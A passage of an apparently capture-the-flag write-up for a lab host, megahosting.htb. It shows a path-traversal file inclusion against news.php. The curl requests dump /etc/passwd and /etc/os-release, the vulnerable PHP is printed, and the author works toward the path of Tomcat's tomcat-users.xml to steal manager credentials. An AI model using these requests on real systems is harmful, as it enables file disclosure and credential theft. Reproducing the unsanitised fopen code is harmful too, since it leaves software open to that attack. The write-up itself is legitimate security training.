</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>megahosting</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>news</span><span class=o>.</span><span class=n>php</span>\<span class=err>?</span><span class=n>file</span>\<span class=o>=../../../../../../</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
</span></span><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>timesync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Time</span> <span class=n>Synchronization</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>106</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>tss</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=n>TPM</span> <span class=n>software</span> <span class=n>stack</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tpm</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>112</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>tcpdump</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>113</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>landscape</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>115</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>landscape</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>pollinate</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>110</span><span class=p>:</span><span class=mi>1</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>pollinate</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>coredump</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>999</span><span class=p>:</span><span class=mi>999</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Core</span> <span class=n>Dumper</span><span class=p>:</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lxd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>998</span><span class=p>:</span><span class=mi>100</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>snap</span><span class=o>/</span><span class=n>lxd</span><span class=o>/</span><span class=n>common</span><span class=o>/</span><span class=n>lxd</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>tomcat</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>997</span><span class=p>:</span><span class=mi>997</span><span class=p>::</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>tomcat</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>mysql</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>112</span><span class=p>:</span><span class=mi>120</span><span class=p>:</span><span class=n>MySQL</span> <span class=n>Server</span><span class=p>,,,:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>ash</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>clive</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>ash</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span></code></pre></td></tr></table></div></div><p>We can also read the source code of this page:
<a href="http://megahosting.htb/news.php?file=../news.php">http://megahosting.htb/news.php?file=../news.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$fh</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=s2>&#34;files/</span><span class=si>$file</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=nv>$line</span> <span class=o>=</span> <span class=nx>fgets</span><span class=p>(</span><span class=nv>$fh</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span><span class=p>(</span><span class=nv>$line</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$fh</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try to access the tomcat manager of the Tomcat server on prot 8080:
http://10.10.10.194:8080/manager/html</p><p>No luck with default credentials, but since we have a LFI we may try to read
the configuration file.</p><p>Let&rsquo;s check on which OS we are before.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl &#39;http://megahosting.htb/news.php?file=../../../../../../../etc/os-release&#39;
</span></span><span class=line><span class=cl>NAME=&#34;Ubuntu&#34;
</span></span><span class=line><span class=cl>VERSION=&#34;20.04 LTS (Focal Fossa)&#34;
</span></span><span class=line><span class=cl>ID=ubuntu
</span></span><span class=line><span class=cl>ID_LIKE=debian
</span></span><span class=line><span class=cl>PRETTY_NAME=&#34;Ubuntu 20.04 LTS&#34;
</span></span><span class=line><span class=cl>VERSION_ID=&#34;20.04&#34;
</span></span><span class=line><span class=cl>HOME_URL=&#34;https://www.ubuntu.com/&#34;
</span></span><span class=line><span class=cl>SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
</span></span><span class=line><span class=cl>BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
</span></span><span class=line><span class=cl>PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
</span></span><span class=line><span class=cl>VERSION_CODENAME=focal
</span></span><span class=line><span class=cl>UBUNTU_CODENAME=focal
</span></span></code></pre></td></tr></table></div></div><p>If we search the tomcat package for Ubuntu focal (20.04) we find it&rsquo;s in
<a href="https://packages.ubuntu.com/search?keywords=tomcat&searchon=names&suite=focal&section=all">version 9</a>.</p><p>PS: <a href=http://megahosting.htb:8080/>http://megahosting.htb:8080/</a> also discloses the tomcat version.</p><p>The config file storing the manager credentials is
<code>$CATALINA_HOME/conf/tomcat-users.xml</code>.</p><p>On Ubuntu <code>$CATALINA_HOME</code> = <code>/usr/share/tomcat{x}</code> where <code>{x}</code> is the version
of tomcat eg. 7, 8, 9, etc. Also the config folder is <code>/etc/tomcat{x}</code>.</p><p>But <code>/etc/tomcat{x}</code> may be for older versions only.</p><p>Let&rsquo;s check the files list for <code>tomcat9</code> for ubuntu:
<a href=https://packages.ubuntu.com/focal/all/tomcat9/filelist>https://packages.ubuntu.com/focal/all/tomcat9/filelist</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>cron</span><span class=o>.</span><span class=n>daily</span><span class=o>/</span><span class=n>tomcat9</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>rsyslog</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>.</span><span class=n>conf</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>policy</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>01</span><span class=n>system</span><span class=o>.</span><span class=n>policy</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>policy</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>02</span><span class=n>debian</span><span class=o>.</span><span class=n>policy</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>policy</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>03</span><span class=n>catalina</span><span class=o>.</span><span class=n>policy</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>policy</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>04</span><span class=n>webapps</span><span class=o>.</span><span class=n>policy</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>policy</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>50</span><span class=n>local</span><span class=o>.</span><span class=n>policy</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>system</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>.</span><span class=n>service</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>sysusers</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>.</span><span class=n>conf</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tmpfiles</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>.</span><span class=n>conf</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>libexec</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>tomcat</span><span class=o>-</span><span class=n>start</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>libexec</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>tomcat</span><span class=o>-</span><span class=n>update</span><span class=o>-</span><span class=n>policy</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>doc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>README</span><span class=o>.</span><span class=n>Debian</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>doc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>changelog</span><span class=o>.</span><span class=n>Debian</span><span class=o>.</span><span class=n>gz</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>doc</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>copyright</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>-</span><span class=n>root</span><span class=o>/</span><span class=n>default_root</span><span class=o>/</span><span class=n>META</span><span class=o>-</span><span class=bp>INF</span><span class=o>/</span><span class=n>context</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>-</span><span class=n>root</span><span class=o>/</span><span class=n>default_root</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>default</span><span class=o>.</span><span class=n>template</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>catalina</span><span class=o>.</span><span class=n>properties</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>context</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>jaspic</span><span class=o>-</span><span class=n>providers</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>logging</span><span class=o>.</span><span class=n>properties</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>server</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>tomcat</span><span class=o>-</span><span class=n>users</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>web</span><span class=o>.</span><span class=n>xml</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>logrotate</span><span class=o>.</span><span class=n>template</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>conf</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>logs</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>tomcat9</span><span class=o>/</span><span class=n>work</span>
</span></span></code></pre></td></tr></table></div></div><p>So it&rsquo;s seems ubuntu mapped the files differently than the apache defaults,
so it won&rsquo;t be <code>$TOMCAT_HOME/conf/tomcat-users.xml</code> but
<code>$TOMCAT_HOME/etc/tomcat-users.xml</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
